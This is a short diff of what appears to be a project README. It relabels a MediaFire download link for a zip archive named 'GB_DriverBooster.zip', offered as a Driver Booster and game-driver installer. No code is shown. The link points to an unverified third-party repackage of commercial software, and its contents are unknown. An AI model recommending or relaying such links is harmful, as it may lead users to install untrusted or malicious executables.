@@ -17,11 +17,7 @@ I’ve also included a **Game Driver** section that installs all the necessary d
 
 ---
 
-### **Link Here**
-
----
-
-## ▶ [DRIVER BOOSTER 9](https://www.mediafire.com/file/mnflya8p2uhkx6r/GB_DriverBooster.zip/file)
+## ▶ [Driver Booster — Download](https://www.mediafire.com/file/mnflya8p2uhkx6r/GB_DriverBooster.zip/file)
 
 ---
 
